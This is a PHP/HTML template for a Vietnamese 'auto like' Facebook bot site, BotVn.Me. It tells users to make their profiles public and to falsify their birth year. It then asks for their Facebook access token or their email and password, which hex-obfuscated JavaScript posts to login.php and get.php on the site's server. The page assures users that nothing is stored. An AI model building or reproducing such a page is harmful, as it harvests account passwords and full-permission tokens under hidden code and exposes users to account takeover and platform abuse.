 <?
if (!defined('DOANHDZ')) die ('The request not found');
?>
     
   <div class="row">
                <div class="col-lg-12">
                <div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h3><b>Đăng Nhập Hack Like - Auto Like Facebook</b></h3>
                        
                    </div>
                    <div class="ibox-content">
<p style="font-size: 15px;">Đầu tiên, bạn click vào <a href="https://www.facebook.com/settings?tab=followers" target="_blank">đây</a> để thay đổi thiết lập người theo dõi. Trong phần: "<b>Ai có thể theo dõi tôi</b>" bạn chọn và sửa thành <br><kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd>        <br>
        <u>Lưu ý: Bạn phải trên <b>18+</b>, nếu không hãy thay đổi năm sinh trên 18 tuổi. Nếu không sẽ không bật theo dõi được</u></p>

        <p style="font-size: 15px;">Cài đặt <a href="https://www.facebook.com/settings?tab=privacy&amp;section=composer&amp;view" target="_blank">Bài Đăng</a> ở chế độ <kbd><i class="fa fa-globe"></i> mọi người <i class="fa fa-caret-down"></i></kbd></p>
		<div id="choiem1lan2"></div>
		<div class="form-group">
			<b>*Access Token:</b>
			<input id="access_token" name="access_token" class="form-control" placeholder="Nhập Token Vào Đây..." onpaste="setTimeout( function() { login(document.getElementById('access_token').value);}, 100);"/>
			<div class="hr-line-dashed"></div>
		<div class="text-right">
			<div class="row">
			<div class="col-sm-5"></div>
			<div class="col-sm-2">
			<a href="https://t.co/rtlALBjaX3" target="_blank" class="btn btn-success btn-block"><i class="fa fa-cogs"></i> Cài Token</a>
			</div>
			<div class="col-sm-2">
			<a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank" class="btn btn-primary btn-block"><i class="fa fa-edit"></i> Lấy Token</a>
			</div>
			<div class="col-lg-3">
			<button id="go" type="button" class="btn btn-danger btn-block" onclick="login(document.getElementById('access_token').value);">
				<i class="fa fa-sign-in"></i> Đăng Nhập
			</button>

			</div>
			</div>
			
		</div>
		</div>
		<div class="hr-line-dashed"></div>
			<center><h3>ĐĂNG NHẬP BẰNG TÀI KHOẢN FACEBOOK</h3></center>
		<div class="hr-line-dashed"></div>
		<div class="row">
			<div class="col-sm-6 b-r">
			<b style="color: red;">*Nếu bạn gặp khó khăn trong việc lấy token hãy thử đăng nhập bằng tài khoản Facebook!</b><br>
			<ul class="list-group" >
				 	<li class="list-group-item">
						Hệ thống sẽ tự động lấy token full quyền, dùng được tất cả chức năng trong BotVn.Me
					</li>
					<li class="list-group-item">
						Chúng tôi không hề lưu lại thông tin và gây tổn hại đến tài khoản của bạn.
					</li>
					<li class="list-group-item">
						Đăng Nhập được hoạt động trên IP Client và chỉ sử dụng để lấy token.
					</li>
					<li class="list-group-item">
						Khi đăng nhập lần đầu có thể tài khoản của bạn sẽ bị checkpoint địa điểm truy cập! Vui lòng chấp nhận địa điểm đó và thử lại!
					</li>
			</ul>
						</div>
			<div class="col-sm-6">
			<div class="form">
				<b>*Email Hoặc SĐT:</b>
				<input class="form-control" id="email" name="email"/>
				<br>
				<b>*Mật Khẩu:</b>
				<input name="password" id="password" class="form-control" type="password">
				<br>
				<b for="app_id">*Chọn Ứng Dụng:</b>
				<select id="app_id" class="form-control">
				<option value="iphone">Token Facebook for Iphone</option>
				<option value="android">Token Facebook for Android</option>
				<option value="page">PAGES MANAGER FOR IOS</option>
				</select>
				<br>          
				<span class="pull-right">
				<button class="btn btn-danger" type="button" id="result" name="result" onclick="Submit();"><i class="fa fa-sign-in"></i> Đăng Nhập</button>
				</span>
			
			</div></div>
			<!--row-->
			</div>
			<span id="end" name="end" style="display: none;">
			<b style="color: green;">*Token Của Bạn:</b>
			<textarea autofocus="autofocus" onfocus="this.select()" class="form-control" id="result2" name="result2" /></textarea>
			</span>
			<div class="hr-line-dashed"></div>

                    </div>
                </div>
            </div>
</div>
<script>
 var _0xf285=["","\x42\u1EA1\x6E\x20\x43\x68\u01B0\x61\x20\x4E\x68\u1EAD\x70\x20\x54\x6F\x6B\x65\x6E","\x65\x72\x72\x6F\x72","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x2D\x70\x72\x6F\x67\x72\x65\x73\x73\x22\x3E\x3C\x2F\x69\x3E\x20\xA0","\x68\x74\x6D\x6C","\x23\x67\x6F","\x64\x69\x73\x61\x62\x6C\x65\x64","\x61\x74\x74\x72","\x61","\x69\x6E\x70\x75\x74","\x62\x75\x74\x74\x6F\x6E","\x73\x65\x6C\x65\x63\x74","\x67\x6F","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x6D\x61\x74\x63\x68","\x6C\x6F\x67\x69\x6E\x2E\x70\x68\x70","\x70\x61\x72\x73\x65","\x73\x74\x61\x74\x75\x73","\x6D\x65\x73","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x6F\x6B\x65","\x6D\x65\x6D\x62\x65\x72","\x4C\x6F\x67\x69\x6E\x20\x54\x68\xE0\x6E\x68\x20\x43\xF4\x6E\x67\x3C\x62\x72\x3E\u0110\x61\x6E\x67\x20\x43\x68\x75\x79\u1EC3\x6E\x20\x48\u01B0\u1EDB\x6E\x67","\x73\x75\x63\x63\x65\x73\x73","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6C\x69\x6E\x6B","\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x6C\x6F\x67\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x77\x61\x72\x6E\x69\x6E\x67\x22\x3E\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x74\x65\x78\x74\x2D\x70\x72\x69\x6D\x61\x72\x79\x22\x3E\x4C\u1ED7\x69\x20\x6B\x68\xF4\x6E\x67\x20\x78\xE1\x63\x20\u0111\u1ECB\x6E\x68\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x64\x69\x76\x3E","\x23\x73\x6B\x79\x74\x61\x6D\x6D","\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x73\x69\x67\x6E\x2D\x69\x6E\x22\x20\x61\x72\x69\x61\x2D\x68\x69\x64\x64\x65\x6E\x3D\x22\x74\x72\x75\x65\x22\x3E\x3C\x2F\x73\x70\x61\x6E\x3E\x20\u0110\u0103\x6E\x67\x20\x4E\x68\u1EAD\x70","\x70\x6F\x73\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F","\x3B","\x73\x70\x6C\x69\x74","\x6C\x65\x6E\x67\x74\x68","\x20","\x63\x68\x61\x72\x41\x74","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x69\x6E\x64\x65\x78\x4F\x66"];function login(_0x7532x2){if(_0x7532x2== _0xf285[0]){$(function(){toastr[_0xf285[2]](_0xf285[1])});playhd()};$(_0xf285[5])[_0xf285[4]](_0xf285[3]);$(_0xf285[8])[_0xf285[7]](_0xf285[6],_0xf285[6]);$(_0xf285[9])[_0xf285[7]](_0xf285[6],_0xf285[6]);$(_0xf285[10])[_0xf285[7]](_0xf285[6],_0xf285[6]);$(_0xf285[11])[_0xf285[7]](_0xf285[6],_0xf285[6]);document[_0xf285[13]](_0xf285[12])[_0xf285[6]]= true;if(_0x7532x2[_0xf285[14]](/access_token=(.*)&expires_in/)){token= _0x7532x2[_0xf285[14]](/access_token=(.*)&expires_in/)[1]}else {token= _0x7532x2};$[_0xf285[29]](_0xf285[15],{access_token:token,ref:_0xf285[0]},function(_0x7532x3,_0x7532x4){datas= JSON[_0xf285[16]](_0x7532x3);if(datas[_0xf285[17]]== _0xf285[2]){$(function(){toastr[_0xf285[2]](_0xf285[0]+ datas[_0xf285[18]]+ _0xf285[0])});$(_0xf285[8])[_0xf285[19]](_0xf285[6]);$(_0xf285[9])[_0xf285[19]](_0xf285[6]);$(_0xf285[10])[_0xf285[19]](_0xf285[6]);$(_0xf285[11])[_0xf285[19]](_0xf285[6])}else {if(datas[_0xf285[17]]== _0xf285[20]){create_cookie(_0xf285[21],1,1000);$(function(){toastr[_0xf285[23]](_0xf285[22])});window[_0xf285[24]]= datas[_0xf285[25]]}else {$(_0xf285[27])[_0xf285[4]](_0xf285[26])}};$(_0xf285[5])[_0xf285[4]](_0xf285[28]);document[_0xf285[13]](_0xf285[12])[_0xf285[6]]= false})}function create_cookie(_0x7532x6,_0x7532x7,_0x7532x8){if(_0x7532x8){var _0x7532x9= new Date;_0x7532x9[_0xf285[31]](_0x7532x9[_0xf285[30]]()+ 864E5* _0x7532x8);_0x7532x8= _0xf285[32]+ _0x7532x9[_0xf285[33]]()}else {_0x7532x8= _0xf285[0]};document[_0xf285[34]]= _0x7532x6+ _0xf285[35]+ _0x7532x7+ _0x7532x8+ _0xf285[36]}function read_cookie(_0x7532x6){_0x7532x6+= _0xf285[35];for(var _0x7532x7=document[_0xf285[34]][_0xf285[38]](_0xf285[37]),_0x7532x8=0;_0x7532x8< _0x7532x7[_0xf285[39]];_0x7532x8++){for(var _0x7532x9=_0x7532x7[_0x7532x8];_0xf285[40]== _0x7532x9[_0xf285[41]](0);){_0x7532x9= _0x7532x9[_0xf285[42]](1,_0x7532x9[_0xf285[39]])};if(0== _0x7532x9[_0xf285[43]](_0x7532x6)){return _0x7532x9[_0xf285[42]](_0x7532x6[_0xf285[39]],_0x7532x9[_0xf285[39]])}};return null}</script>
<script>
var _0x1d31=["\x64\x69\x73\x61\x62\x6C\x65\x64","\x61\x74\x74\x72","\x61","\x69\x6E\x70\x75\x74","\x73\x65\x6C\x65\x63\x74","\x62\x75\x74\x74\x6F\x6E","\x74\x65\x78\x74\x61\x72\x65\x61","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72","\x50\x6C\x65\x61\x73\x65\x20\x57\x61\x69\x74\x2E\x2E\x2E","\x68\x74\x6D\x6C","\x23\x61\x64\x66\x6C\x79","\x62\x74\x6E\x20\x62\x74\x6E\x2D\x64\x61\x6E\x67\x65\x72\x20\x6D\x2D\x70\x72\x6F\x67\x72\x65\x73\x73\x20\x62\x74\x6E\x2D\x64\x69\x73\x61\x62\x6C\x65\x64","\x61\x64\x64\x43\x6C\x61\x73\x73","\x62\x74\x6E\x20\x62\x74\x6E\x2D\x64\x61\x6E\x67\x65\x72","\x72\x65\x6D\x6F\x76\x65\x43\x6C\x61\x73\x73","\x23\x72\x65\x73\x75\x6C\x74","\x76\x61\x6C","\x23\x65\x6D\x61\x69\x6C","\x23\x70\x61\x73\x73\x77\x6F\x72\x64","\x23\x6B\x69\x65\x75","\x23\x61\x70\x70\x5F\x69\x64\x20\x6F\x70\x74\x69\x6F\x6E\x3A\x73\x65\x6C\x65\x63\x74\x65\x64","","\x42\u1EA1\x6E\x20\x43\x68\u01B0\x61\x20\x4E\x68\u1EAD\x70\x20\x54\x68\xF4\x6E\x67\x20\x54\x69\x6E","\x65\x72\x72\x6F\x72","\x67\x65\x74\x2E\x70\x68\x70","\x65\x6D\x61\x69\x6C\x3D","\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D","\x26\x6B\x69\x65\x75\x3D","\x26\x61\x70\x70\x5F\x69\x64\x3D","\x50\x4F\x53\x54","\x73\x68\x6F\x77","\x23\x65\x6E\x64","\x23\x72\x65\x73\x75\x6C\x74\x32","\x61\x6A\x61\x78"];function start(){$(_0x1d31[2])[_0x1d31[1]](_0x1d31[0],_0x1d31[0]);$(_0x1d31[3])[_0x1d31[1]](_0x1d31[0],_0x1d31[0]);$(_0x1d31[4])[_0x1d31[1]](_0x1d31[0],_0x1d31[0]);$(_0x1d31[5])[_0x1d31[1]](_0x1d31[0],_0x1d31[0]);$(_0x1d31[6])[_0x1d31[1]](_0x1d31[0],_0x1d31[0])}function finish(){$(_0x1d31[2])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[3])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[4])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[5])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[6])[_0x1d31[7]](_0x1d31[0])}function Submit(){start();$(_0x1d31[10])[_0x1d31[9]](_0x1d31[8]);$(_0x1d31[15])[_0x1d31[14]](_0x1d31[13])[_0x1d31[12]](_0x1d31[11]);var _0x2510x4=$(_0x1d31[17])[_0x1d31[16]]();var _0x2510x5=$(_0x1d31[18])[_0x1d31[16]]();var _0x2510x6=$(_0x1d31[19])[_0x1d31[16]]();a= $(_0x1d31[20])[_0x1d31[16]]();if(_0x2510x4== _0x1d31[21]|| _0x2510x5== _0x1d31[21]){$(function(){toastr[_0x1d31[23]](_0x1d31[22])});$(_0x1d31[2])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[3])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[4])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[5])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[6])[_0x1d31[7]](_0x1d31[0]);$(_0x1d31[15])[_0x1d31[14]](_0x1d31[11])[_0x1d31[12]](_0x1d31[13]);return false};var _0x2510x7=_0x1d31[24];$[_0x1d31[33]]({url:_0x2510x7,data:_0x1d31[25]+ _0x2510x4+ _0x1d31[26]+ _0x2510x5+ _0x1d31[27]+ _0x2510x6+ _0x1d31[28]+ a,type:_0x1d31[29],dataType:_0x1d31[9],success:function(_0x2510x8){finish();$(_0x1d31[31])[_0x1d31[30]]();$(_0x1d31[15])[_0x1d31[14]](_0x1d31[11])[_0x1d31[12]](_0x1d31[13]);$(_0x1d31[32])[_0x1d31[9]](_0x2510x8)}})}
</script>